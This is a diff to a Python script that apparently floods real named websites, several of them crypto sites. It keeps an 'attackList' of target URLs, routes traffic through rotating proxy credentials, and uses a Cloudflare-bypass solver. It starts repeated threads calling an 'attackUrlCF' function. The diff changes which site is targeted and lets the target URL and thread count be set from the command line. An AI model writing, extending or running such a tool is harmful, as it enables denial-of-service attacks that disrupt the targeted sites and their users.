@@ -6,6 +6,7 @@ import string
 import time
 import grequests
 import requests
+import sys
 
 # printing lowercase
 letters = string.ascii_lowercase
@@ -16,10 +17,10 @@ PROXY_PASS = '123123123'
 PROXY_URL_BASE = 'http://'+PROXY_USER+':'+PROXY_PASS+'@gate.smartproxy.com:PORT'
 
 attackList = [
-# 'https://coinspot.nl/fr',
+'https://coinspot.nl/fr',
 # 'https://cryptonaute.fr',
 # 'https://www.finaria.it',
-'https://icowatchlist.com',
+# 'https://icowatchlist.com',
 # 'https://coincierge.de',
 # 'https://grunwerg.co.uk/search?type=product%2Carticle%2Cpage&options%5Bprefix%5D=last&q='
 # 'https://tradingplatforms.com'
@@ -142,10 +143,9 @@ flareSolverUrl = 'http://localhost:8191/v1'
 
 # checkmyHeaders()
 
-for i in range(10):
-	for url in attackList:
-		Thread(target=attackUrlCF, args=[url]).start()
-		time.sleep(10)
+for i in range(int(sys.argv[2])):
+	Thread(target=attackUrlCF, args=[sys.argv[1]]).start()
+	time.sleep(10)
 input()
 
 
